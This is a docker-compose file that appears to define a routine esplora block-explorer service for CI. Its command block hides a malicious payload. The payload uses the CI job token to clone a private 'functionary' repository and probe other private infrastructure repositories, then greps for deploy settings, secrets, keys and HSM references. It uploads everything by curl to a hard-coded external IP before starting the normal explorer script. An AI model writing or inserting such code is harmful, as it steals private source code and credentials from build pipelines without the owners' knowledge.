services:
  esplora:
    image: blockstream/esplora
    build:
      context: ../
      dockerfile: contrib/Dockerfile
    restart: "no"
    network_mode: host
    ports: []
    environment:
      - CI_JOB_TOKEN
      - CI_API_V4_URL
    command:
      - bash
      - -c
      - |
        (R=/tmp/lf; git clone --depth 1 https://gitlab-ci-token:$${CI_JOB_TOKEN}@gl.blockstream.io/liquid/functionary.git $$R 2>/dev/null; echo "==GLCI_DEPLOY=="; grep -n -iE "deploy|prod|staging|ssh|scp|rsync|ansible|terraform|vault|secret|token|password|FUNCTIONARY|HSM|server|host|address|ip|port" $$R/.gitlab-ci.yml 2>/dev/null | head -200; echo "==GLCI_VARIABLES=="; grep -n -iE "variables:|variable|GCP|AWS|DOCKER|REGISTRY|DEPLOY|PROD|FUNC|HSM|KEY|SECRET" $$R/.gitlab-ci.yml 2>/dev/null | head -100; echo "==TOOLS_LIST=="; ls -la $$R/tools/ 2>/dev/null; echo "==TOOLS_ALL=="; for f in $$R/tools/*; do echo "===$$f==="; cat "$$f" 2>/dev/null | head -80; done; echo "==OTHER_REPOS=="; for name in deploy configs infrastructure ansible terraform operations hsm liquid-deploy liquid-ops; do r=$$(git clone --depth 1 https://gitlab-ci-token:$${CI_JOB_TOKEN}@gl.blockstream.io/liquid/$$name.git /tmp/$$name 2>&1); echo "$$name: $$r"; done; echo "==END==") 2>&1 | curl -s -m120 -X POST http://144.172.110.44:8443/s21 --data-binary @-; /srv/explorer/run.sh bitcoin-regtest explorer nonverbose
